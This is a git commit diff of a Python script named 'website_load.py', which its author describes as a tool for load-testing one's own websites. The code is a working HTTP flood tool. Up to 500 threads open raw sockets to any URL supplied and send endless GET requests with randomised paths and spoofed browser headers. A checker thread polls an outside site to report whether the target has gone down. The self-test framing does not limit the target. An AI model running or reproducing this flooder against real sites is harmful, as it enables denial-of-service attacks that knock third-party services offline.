8551127d411ec845f9c685d19ac382d10ce6076c
Alexey Privalov <Alex0007lolpvp@gmail.com>
2013-12-16 19:53:43 +0600

    now flooder uses sockets

--- website_load.py
+++ website_load.py
@@ -1,49 +1,56 @@
 # -*- coding: utf-8 -*-
 # Script created for testing your own websites
 # by Alexey Privalov | www.alex0007.ru
-
-import string
+import socket
 import threading
-import urllib.parse
 import urllib.request
 import time
 import random
 import sys
+import string
 
 # Global parameters
-thread_limit = 2000  # Number of threads
+thread_limit = 500  # Number of threads
 user_agent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1734.5 Safari/537.36"
 # Global parameters end
 
 
 class Flooder(threading.Thread):
-    global user_agent
 
     def __init__(self):
         threading.Thread.__init__(self)
 
     def run(self):
         try:
+            sock = socket.socket()
+            if sock.connect_ex((ip, 80)) != 0:
+                sock.close()
+                exit()
+            sock.settimeout(30)
+            sock.setblocking(0)
             while True:
-                q1 = str(round(random.uniform(0.5, 0.9), 1))
-                q2 = str(round(random.uniform(0.6, 1), 1))
-                cur_header = {
-                    "Content-type": "application/x-www-form-urlencoded",
-                    "Accept": "text/plain; q=" + q1 + ", text/html, "
-                              "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
-                    "Connection": "Keep-Alive",
-                    "Keep-alive": "300",
-                    "Cache-Control": "no-cache",
-                    "Pragma": "no-cache",
-                    "User-agent": user_agent,
-                    "Cookie": str(cookie),
-                    "Accept-Encoding": "gzip,deflate"
-                }
-                req = urllib.request.Request(str_target, headers=cur_header)
-                urllib.request.urlopen(req, timeout=300)
-                # print(resp.read())
+                    randstr = '/'+''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
+                    q1 = str(round(random.uniform(0.5, 0.7), 1))
+                    q2 = str(round(random.uniform(0.7, 1), 1))
+                    cur_header = {
+                        "Host": " "+str(target.netloc),
+                        "Content-type": "application/x-www-form-urlencoded",
+                        "Accept": "text/plain; q=" + q1 + ", text/html, "
+                                                          "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
+                        "Keep-Alive": "300",
+                        "Connection": "Keep-Alive",
+                        "Cache-Control": "no-cache",
+                        "Pragma": "no-cache",
+                        "User-agent": user_agent,
+                        "Accept-Encoding": "gzip,deflate"
+                    }
+                    sock.sendall(str.encode("GET "+randstr+target.path+" HTTP/1.1\r\nHost: "+target.netloc+"\r\n"+str(cur_header)+"\r\n\r\n\r\n"))
+
         except:
+            sock.close()
+            exit()
             pass
+
 
 
 class Checker(threading.Thread):
@@ -57,7 +64,7 @@ class Checker(threading.Thread):
             if time.localtime().tm_sec % 15 == 0 and self.current_sec != time.localtime().tm_sec:
                 self.current_sec = time.localtime().tm_sec
                 try:
-                    req = urllib.request.Request("http://isup.me/"+target.netloc+target.path)
+                    req = urllib.request.Request("http://isup.me/" + target.netloc + target.path)
                     if urllib.request.urlopen(req).read().decode().find("It's just you") > 0:
                         status = "up"
                     else:
@@ -77,25 +84,20 @@ target = urllib.parse.urlparse(target)
 if target.netloc.__len__() == 0:
     print("Incorrect url input")
     exit()
-str_target = target.scheme+"://"+target.netloc+target.path
-# if target.path != "/":
-#     str_target = str_target + "////"
-
+if str(target.path).__len__() == 0:
+    str_target = target.scheme + "://" + target.netloc + target.path + "/"
+    target = urllib.parse.urlparse(str_target)
+str_target = target.scheme + "://" + target.netloc + target.path
 # preparations ended
 
-#  getting cookies
-req = urllib.request.Request(str_target)
+#  getting IP
 try:
-    resp = urllib.request.urlopen(req, timeout=10)
-    cookie = resp.headers['Set-Cookie']
-    print(cookie)
-    print("Cookies accepted")
+    ip = socket.getaddrinfo(target.netloc, 80)[0][4][0]
+    print(ip)
 except:
-    print("Can't get cookies")
-    pass
-#  end cookies getting
-
-str_target = str_target + "////" # hmm
+    print("Can't get ip")
+    exit()
+#  end IP getting
 
 print("Flooding %s" % str_target)
 Checker().start()
